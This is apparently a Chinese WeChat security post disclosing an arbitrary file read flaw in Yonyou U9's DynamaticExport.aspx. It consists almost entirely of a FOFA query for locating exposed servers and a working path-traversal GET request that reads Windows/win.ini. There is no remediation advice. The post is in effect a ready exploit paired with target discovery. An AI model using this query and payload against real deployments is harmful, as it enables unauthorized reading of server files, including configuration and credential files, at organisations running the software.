> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzIxMTg1ODAwNw==&mid=2247500953&idx=1&sn=616ebafdcd78c30f209b3f5ed9a2a080

#  用友U9 DynamaticExport任意文件读取漏洞  
原创 安全透视镜  网络安全透视镜   2025-07-10 23:10  
  
fofa语法  

```
body=&#34;logo-u9.png&#34;
```

  
  
POC  
  
GET  

```
/print/DynamaticExport.aspx?filePath=../../../../../../../../../../../../Windows/win.ini
```

  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS6icy66iaCGzdwSliaQuia2D3ozEibibhQIsGdzicm8zq5jH9LuIdRzErfdmDNug57H8Q8icJQSLISqkGYib1w/640?wx_fmt=png&from=appmsg "")  
  
  
  
